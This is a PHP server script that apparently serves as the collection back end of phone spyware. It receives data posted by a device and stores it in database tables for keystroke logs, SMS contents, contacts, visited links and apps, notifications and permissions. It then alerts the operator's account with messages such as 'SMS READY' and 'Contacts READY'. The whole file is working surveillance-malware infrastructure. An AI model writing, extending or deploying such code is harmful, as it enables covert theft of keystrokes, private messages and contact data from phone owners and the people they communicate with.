<?php

//this called from the phone to store data in server


require_once 'yarsap_14881.php';



function AlertUser($email, $token, $msg, $ico, $title, $author)
{

    //ON SERVER
    //$alerterUrl = "http://localhost/[ROOT DIR]/private/yarsap_83911.php";

    //XAMMP
    $alerterUrl = "http://localhost/private/yarsap_83911.php";

    $data = array(
        'email' => $email,
        'token' => $token,
        'command' => 'new',
        'msg' => $msg,
        'ico' => $ico,
        'title' => $title,
        'author' => $author,
    );

    $options = array(
        'http' => array(
            'header' => "Content-type: application/json\r\n",
            'method' => 'POST',
            'content' => json_encode($data),
        ),
    );

    $context = stream_context_create($options);
    $result = file_get_contents($alerterUrl, false, $context);

    if ($result !== false) {
        return $result; // Assuming yarsap_83911.php returns JSON
    } else {
        return false;
    }
}

// Check if the request method is POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Assuming you have a database connection established


    $conn = new mysqli(DB_ServerName, DB_UserName, DB_Password, DB_Name);

    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }


    $userEmail = $_POST['user_email'] ?? 'empty';
    $phone_id = $_POST['phone_id'];
    $messagetype = $_POST['type'];





    $getUserIDQuery = "SELECT userid,token FROM users WHERE email = ?";
    $stmt = $conn->prepare($getUserIDQuery);
    $stmt->bind_param("s", $userEmail);
    $stmt->execute();
    $result = $stmt->get_result();

    if ($result->num_rows > 0) {



        try {
            $logData = "user_email: " . ($_POST['user_email'] ?? 'empty') . ", ";
            $logData .= "phone_id: " . ($_POST['phone_id'] ?? 'empty') . ", ";
            $logData .= "type: " . ($_POST['type'] ?? 'empty') . ", ";


            foreach ($_POST as $key => $value) {
                if ($key != 'user_email' && $key != 'phone_id' && $key != 'type') {
                    $logData .= "$key: $value, ";
                }
            }
            logdebug('to yarsap_2631.php', $logData);
        } catch (\Throwable $th) {
            logError($th);
        }

        $row = $result->fetch_assoc();
        $userId = $row['userid'];
        $usertoken = $row['token'];



        $checkPhoneQuery = "SELECT phone_id,commands,wallpaper FROM phones WHERE phone_id = ?";
        $stmt2 = $conn->prepare($checkPhoneQuery);
        $stmt2->bind_param("i", $phone_id);
        $stmt2->execute();
        $result2 = $stmt2->get_result();



        if ($result2->num_rows > 0) {

            //
            switch ($messagetype) {
                case "Activitys":

                    $bcuz = $_POST['cuz'];

                    switch ($bcuz) {
                        case 'activz':
                            $activitydata = $_POST['data'];
                            $activittime = $_POST['ktime'];
                            // $ranid = md5($activittime);

                            // $numeric_ranid = hexdec(substr($ranid, 0, 8));

                            try {
                                $pdo = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);
                                $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                            } catch (PDOException $e) {
                                logError($e);
                                die('Connection failed');
                            }


                            $query = "INSERT INTO phoneactivity (user_id, activ_id, phone_id, activ_time, activ_data) 
                                      VALUES (:uuid, null, :pid, :ktime, :kdata) 
                                      ON DUPLICATE KEY UPDATE activ_data = VALUES(activ_data)";

                            $stmt = $pdo->prepare($query);

                            $stmt->bindParam(':uuid', $userId, PDO::PARAM_INT);
                            // $stmt->bindParam(':kuid', $numeric_ranid, PDO::PARAM_INT);
                            $stmt->bindParam(':pid', $phone_id, PDO::PARAM_STR);
                            $stmt->bindParam(':ktime', $activittime, PDO::PARAM_STR);
                            $stmt->bindParam(':kdata', $activitydata, PDO::PARAM_STR);

                            try {
                                $stmt->execute();
                                echo 'Done';
                            } catch (PDOException $e) {
                                logError($e);
                                echo Format('641 Something went wrong please try again later.', OP_Fail);
                            }

                            break;
                        case 'notifys':
                            $activitydata = $_POST['data'];
                            $activittime = $_POST['ktime'];
                            // $ranid = md5($activittime);
                            //$numeric_ranid = hexdec(substr($ranid, 0, 8));

                            try {
                                $pdo = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);
                                $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                            } catch (PDOException $e) {
                                logError($e);
                                die('Connection failed');
                            }


                            $query = "INSERT INTO phone_notifys (notifi_id, user_id, phone_id, notifi_time, notifi_data) 
                             VALUES (null, :uuid, :pid, :ktime, :kdata) 
                             ON DUPLICATE KEY UPDATE notifi_data = VALUES(notifi_data)";


                            $stmt = $pdo->prepare($query);

                            $stmt->bindParam(':uuid', $userId, PDO::PARAM_INT);
                            // $stmt->bindParam(':kuid', $numeric_ranid, PDO::PARAM_INT);
                            $stmt->bindParam(':pid', $phone_id, PDO::PARAM_STR);
                            $stmt->bindParam(':ktime', $activittime, PDO::PARAM_STR);
                            $stmt->bindParam(':kdata', $activitydata, PDO::PARAM_STR);

                            try {
                                $stmt->execute();
                                echo 'Done';
                            } catch (PDOException $e) {
                                logError($e);
                                echo Format('641 Something went wrong please try again later.', OP_Fail);
                            }

                            break;
                        case 'vapps':
                            $activitydata = $_POST['data'];
                            $activittime = $_POST['ktime'];
                            // $ranid = md5($activittime);


                            //$numeric_ranid = hexdec(substr($ranid, 0, 8));

                            try {
                                $pdo = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);
                                $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                            } catch (PDOException $e) {
                                logError($e);
                                die('Connection failed');
                            }


                            $query = "INSERT INTO visitedapps (user_id, vapp_id, phone_id, vapp_time, vapp_data) 
                                      VALUES (:uuid, null, :pid, :ktime, :kdata) 
                                      ON DUPLICATE KEY UPDATE vapp_data = VALUES(vapp_data)";

                            $stmt = $pdo->prepare($query);

                            $stmt->bindParam(':uuid', $userId, PDO::PARAM_INT);
                            // $stmt->bindParam(':kuid', $numeric_ranid, PDO::PARAM_INT);
                            $stmt->bindParam(':pid', $phone_id, PDO::PARAM_STR);
                            $stmt->bindParam(':ktime', $activittime, PDO::PARAM_STR);
                            $stmt->bindParam(':kdata', $activitydata, PDO::PARAM_STR);

                            try {
                                $stmt->execute();
                                echo 'Done';
                            } catch (PDOException $e) {
                                logError($e);
                                echo Format('641 Something went wrong please try again later.', OP_Fail);
                            }

                            break;
                        case 'vlinks':

                            $activitydata = $_POST['data'];
                            //$activittime = $_POST['ktime'];
                            // $ranid = md5($activittime);


                            try {
                                $pdo = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);
                                $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                            } catch (PDOException $e) {
                                logError($e);
                                die('Connection failed');
                            }


                            $query = "INSERT INTO visitedlinks (user_id, vlink_id, phone_id, vlink_time, vlink_data) 
                                      VALUES (:uuid, null, :pid, :ktime, :kdata) 
                                      ON DUPLICATE KEY UPDATE vlink_data = VALUES(vlink_data)";

                            $stmt = $pdo->prepare($query);

                            $stmt->bindParam(':uuid', $userId, PDO::PARAM_INT);
                            // $stmt->bindParam(':kuid', $ranid, PDO::PARAM_STR);
                            $stmt->bindParam(':pid', $phone_id, PDO::PARAM_STR);
                            $stmt->bindParam(':ktime', $activittime, PDO::PARAM_STR);
                            $stmt->bindParam(':kdata', $activitydata, PDO::PARAM_STR);

                            try {
                                $stmt->execute();
                                echo 'Done';
                            } catch (PDOException $e) {
                                logError($e);
                                echo Format('641 Something went wrong please try again later.', OP_Fail);
                            }

                            break;
                        case 'keylogs':
                            $activitydata = $_POST['data'];
                            $activittime = $_POST['ktime'];
                            //$ranid = md5($activittime);


                            try {
                                $pdo = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);
                                $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                            } catch (PDOException $e) {
                                logError($e);
                                die('Connection failed');
                            }


                            $query = "INSERT INTO keylogs (user_id, klog_id, phone_id, klog_time, klog_data) 
                                      VALUES (:uuid, NULL, :pid, :ktime, :kdata) 
                                      ON DUPLICATE KEY UPDATE klog_data = VALUES(klog_data)";

                            $stmt = $pdo->prepare($query);

                            $stmt->bindParam(':uuid', $userId, PDO::PARAM_INT);
                            // $stmt->bindParam(':kuid', $ranid, PDO::PARAM_STR);
                            $stmt->bindParam(':pid', $phone_id, PDO::PARAM_STR);
                            $stmt->bindParam(':ktime', $activittime, PDO::PARAM_STR);
                            $stmt->bindParam(':kdata', $activitydata, PDO::PARAM_STR);

                            try {
                                $stmt->execute();
                                echo 'Done';
                            } catch (PDOException $e) {
                                logError($e);
                                echo Format('641 Something went wrong please try again later.', OP_Fail);
                            }

                            break;

                        default:
                            # code...
                            break;
                    }


                    break;
                case "Permissions":
                    $bcuz = $_POST['cuz'];
                    switch ($bcuz) {
                        case 'l':
                            $primsdata = $_POST['data'];


                            try {
                                $pdo = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);
                                $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                            } catch (PDOException $e) {
                                logError($e);
                                die('Connection failed');
                            }

                            $query = "UPDATE phones SET mob_permissions=:prims WHERE phone_id=:pid";

                            $stmt = $pdo->prepare($query);

                            $stmt->bindParam(':prims', $primsdata, PDO::PARAM_STR);
                            $stmt->bindParam(':pid', $phone_id, PDO::PARAM_STR);

                            try {
                                $stmt->execute();
                                echo 'Done';
                            } catch (PDOException $e) {
                                logError($e);
                                echo Format('641 Something went wrong please try again later.', OP_Fail);
                            }

                            break;

                        default:
                            die();
                            //break;
                    }
                    break;
                case "Apps":
                    $bcuz = $_POST['cuz'];
                    switch ($bcuz) {
                        case "l":
                            $fdata = $_POST['data'];

                            if (!str_contains($fdata, SplitLINE)) {
                                echo "data error";
                                exit();
                            }
                            $nomcontactadd = 0;
                            $lines = explode(SplitLINE, $fdata);



                            // Create a PDO instance
                            try {
                                $pdo = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);
                                $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                            } catch (PDOException $e) {
                                logError($e);
                                echo Format('091 Connection failed.', OP_Fail);
                            }

                            foreach ($lines as $line) {
                                if (!str_contains($line, SplitARRAY)) {
                                    continue;
                                }
                                $records = explode(SplitARRAY, $line);
                                $app_name = $records[0];
                                $app_type = $records[1];
                                $app_pkg = $records[2];
                                $app_date = $records[3];
                                $app_ico = $records[4];

                                $app_prims = $records[5];
                                $app_activs = $records[6];
                                $app_rcevrs = $records[7];


                                $querycont = "INSERT INTO phone_apps ( app_id,user_id, app_name, app_ico,app_type, app_pkg,app_date,app_permissions,app_receivers,app_activitys,phone_id) VALUES
                                     (null, :uuid, :appname, :appico, :apptype, :apppkg,:appdate,:apprim,:apprecv,:appactive,:pid)";


                                $stmt = $pdo->prepare($querycont);

                                // Bind parameters to the statement
                                // $stmt->bindParam(':cid', $cont_id, PDO::PARAM_INT);

                                $stmt->bindParam(':uuid', $userId, PDO::PARAM_INT);
                                $stmt->bindParam(':pid', $phone_id, PDO::PARAM_STR);
                                $stmt->bindParam(':appname', $app_name, PDO::PARAM_STR);
                                $stmt->bindParam(':appico', $app_ico, PDO::PARAM_STR);
                                $stmt->bindParam(':apptype', $app_type, PDO::PARAM_STR);
                                $stmt->bindParam(':apppkg', $app_pkg, PDO::PARAM_STR);
                                $stmt->bindParam(':appdate', $app_date, PDO::PARAM_STR);

                                $stmt->bindParam(':apprim', $app_prims, PDO::PARAM_STR);
                                $stmt->bindParam(':apprecv', $app_rcevrs, PDO::PARAM_STR);
                                $stmt->bindParam(':appactive', $app_activs, PDO::PARAM_STR);

                                try {
                                    $stmt->execute();
                                    $nomcontactadd += 1;
                                } catch (PDOException $e) {
                                    logError($e);
                                    echo Format('641 Something went wrong please try again later.', OP_Fail);
                                }

                                // Close the connection


                            }
                            $pdo = null;
                            if ($nomcontactadd > 0) {
                                $row = $result2->fetch_assoc();
                                $phonewall = $row['wallpaper'];


                                $email = $userEmail;
                                $token = $usertoken;
                                $msg = "Apps finished loading...";
                                $ico = $phonewall;
                                $title = 'Apps READY';
                                $author = "clients";

                                $response = AlertUser($email, $token, $msg, $ico, $title, $author);

                                if ("ok" === json_decode($response)) {
                                    // Successfully called yarsap_83911.php with the "new" command, handle the response
                                    // var_dump($response);
                                    echo "Done";
                                } else {
                                    // Handle the case when the request fails
                                    echo "(cont) ";
                                }
                            }
                            break;
                    }
                    break;
                case "Alert":
                    $row = $result2->fetch_assoc();
                    $phonewall = $row['wallpaper'];


                    $email = $userEmail;
                    $token = $usertoken;
                    $msg = $_POST['msg'];
                    $ico = $phonewall;
                    $title = $_POST['title'];
                    $author = "clients";

                    $response = AlertUser($email, $token, $msg, $ico, $title, $author);


                    $responseArray = json_decode($response, true);

                    if (isset($responseArray['Success'])) {
                        echo "Done";
                    } else {
                        echo "Error while alert user";
                    }

                    break;
                    // case "files":
                    //     // here store 


                    //     $bcuz = $_POST['cuz'];

                    //     switch ($bcuz) {
                    //             //load
                    //         case "l":
                    //             $fdata = $_POST['data'];
                    //             $cpath = $_POST['cpath'];

                    //             $filequery = "UPDATE phones SET files_data = ? , files_path = ? WHERE phone_id = ?";
                    //             $stmt3 = $conn->prepare($filequery);
                    //             $stmt3->bind_param("sss", $fdata, $cpath, $phone_id);
                    //             $stmt3->execute();
                    //             $result2 = $stmt3->get_result();
                    //             break;
                    //     }

                    //     break;
                case "Conts":
                    $bcuz = $_POST['cuz'];
                    switch ($bcuz) {
                        case "l":
                            $fdata = $_POST['data'];

                            if (!str_contains($fdata, SplitLINE)) {
                                echo "data error";
                                exit();
                            }
                            $nomcontactadd = 0;
                            $lines = explode(SplitLINE, $fdata);




                            // Create a PDO instance
                            try {
                                $pdo = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);
                                $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                            } catch (PDOException $e) {
                                logError($e);
                                echo Format('091 Connection failed.', OP_Fail);
                            }
                            foreach ($lines as $line) {
                                if (!str_contains($line, SplitARRAY)) {
                                    continue;
                                }
                                $records = explode(SplitARRAY, $line);
                                $cont_name = $records[0];
                                $cont_number = $records[1];
                                $cont_via = $records[2];
                                $og_cont_id = $records[3];
                                // $cont_id = $records[4];


                                $querycont = "INSERT INTO contacts ( user_id, phone_id, cont_address,cont_name, cont_via,og_id) VALUES
                                     ( :uuid, :pid, :caddress, :cname, :cvia,:ocid)";


                                $stmt = $pdo->prepare($querycont);

                                // Bind parameters to the statement
                                // $stmt->bindParam(':cid', $cont_id, PDO::PARAM_INT);
                                $stmt->bindParam(':uuid', $userId, PDO::PARAM_INT);
                                $stmt->bindParam(':pid', $phone_id, PDO::PARAM_STR);
                                $stmt->bindParam(':caddress', $cont_number, PDO::PARAM_STR);
                                $stmt->bindParam(':cname', $cont_name, PDO::PARAM_STR);
                                $stmt->bindParam(':cvia', $cont_via, PDO::PARAM_STR);
                                $stmt->bindParam(':ocid', $og_cont_id, PDO::PARAM_STR);

                                try {
                                    $stmt->execute();
                                    $nomcontactadd += 1;
                                } catch (PDOException $e) {
                                    logError($e);
                                    echo Format('641 Something went wrong please try again later.', OP_Fail);
                                }

                                // Close the connection


                            }
                            $pdo = null;
                            if ($nomcontactadd > 0) {
                                $row = $result2->fetch_assoc();
                                $phonewall = $row['wallpaper'];


                                $email = $userEmail;
                                $token = $usertoken;
                                $msg = "Contacts finished loading...";
                                $ico = $phonewall;
                                $title = 'Contacts READY';
                                $author = "clients";

                                $response = AlertUser($email, $token, $msg, $ico, $title, $author);

                                if ("ok" === json_decode($response)) {
                                    // Successfully called yarsap_83911.php with the "new" command, handle the response
                                    // var_dump($response);
                                    echo "Done";
                                } else {
                                    // Handle the case when the request fails
                                    echo "(cont) Failed to call yarsap_83911.php";
                                }
                            }
                            break;
                    }
                    break;
                case "SMS":
                    $bcuz = $_POST['cuz'];

                    switch ($bcuz) {
                            //load
                        case "l":
                            $fdata = $_POST['data'];



                            if (!str_contains($fdata, SplitLINE)) {
                                echo "data error";
                                exit();
                            }
                            $nomsmsadd = 0;
                            $lines = explode(SplitLINE, $fdata);




                            // Create a PDO instance
                            try {
                                $pdo = new PDO("mysql:host=" . DB_ServerName . ";dbname=" . DB_Name, DB_UserName, DB_Password);
                                $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                            } catch (PDOException $e) {
                                logError($e);
                                die('Connection failed');
                            }
                            foreach ($lines as $line) {
                                # code...
                                if (!str_contains($line, SplitARRAY)) {
                                    continue;
                                }
                                try {
                                    $records = explode(SplitARRAY, $line);


                                    $addresssms = $records[0];
                                    $namesms = $records[1];
                                    $datesms = $records[2];
                                    $tag = $records[3];
                                    $contentsms = $records[4];
                                    $typesms = $records[5];
                                    $idsms = $records[6];

                                    $sql = "INSERT INTO sms (user_id, phone_id, sms_address, sms_name, sms_date, sms_tag, sms_content, sms_type, sms_id) 
        VALUES (:user_id, :phone_id, :sms_address, :sms_name, :sms_date, :sms_tag, :sms_content, :sms_type, :sms_id)";

                                    // Prepare the PDO statement
                                    $stmt = $pdo->prepare($sql);

                                    // Bind parameters to the statement
                                    $stmt->bindParam(':user_id', $userId, PDO::PARAM_INT);
                                    $stmt->bindParam(':phone_id', $phone_id, PDO::PARAM_STR);
                                    $stmt->bindParam(':sms_address', $addresssms, PDO::PARAM_STR);
                                    $stmt->bindParam(':sms_name', $namesms, PDO::PARAM_STR);
                                    $stmt->bindParam(':sms_date', $datesms, PDO::PARAM_STR);
                                    $stmt->bindParam(':sms_tag', $tag, PDO::PARAM_STR);
                                    $stmt->bindParam(':sms_content', $contentsms, PDO::PARAM_STR);
                                    $stmt->bindParam(':sms_type', $typesms, PDO::PARAM_STR);
                                    $stmt->bindParam(':sms_id', $idsms, PDO::PARAM_INT);
                                    try {
                                        $stmt->execute();
                                        $nomsmsadd += 1;
                                    } catch (PDOException $e) {
                                        logError($e);
                                        echo Format('641 Something went wrong please try again later.', OP_Fail);
                                    }

                                    // Close the connection

                                } catch (\Throwable $th) {
                                }
                            }
                            $pdo = null;
                            if ($nomsmsadd > 0) {
                                $row = $result2->fetch_assoc();
                                $phonewall = $row['wallpaper'];


                                $email = $userEmail;
                                $token = $usertoken;
                                $msg = "Messages finished loading...";
                                $ico = $phonewall;
                                $title = 'SMS READY';
                                $author = "clients";

                                $response = AlertUser($email, $token, $msg, $ico, $title, $author);

                                if ("ok" === json_decode($response)) {
                                    // Successfully called yarsap_83911.php with the "new" command, handle the response
                                    // var_dump($response);
                                    echo "Done";
                                } else {
                                    // Handle the case when the request fails
                                    echo "(sms) Failed to call yarsap_83911.php";
                                }
                            }
                            break;
                    }

                    break;

                default:
                    echo 'Invalid request.';
                    break;
            }
        } else {
            echo "phone does not exist.";
        }
    } else {
        echo "Invalid credentials." . $userEmail;
    }

    try {
        $stmt->close();
    } catch (\Throwable $th) {
        //throw $th;
    }

    try {
        $conn->close();
    } catch (\Throwable $th) {
        //throw $th;
    }
} else {

    echo "Invalid request method.";
}
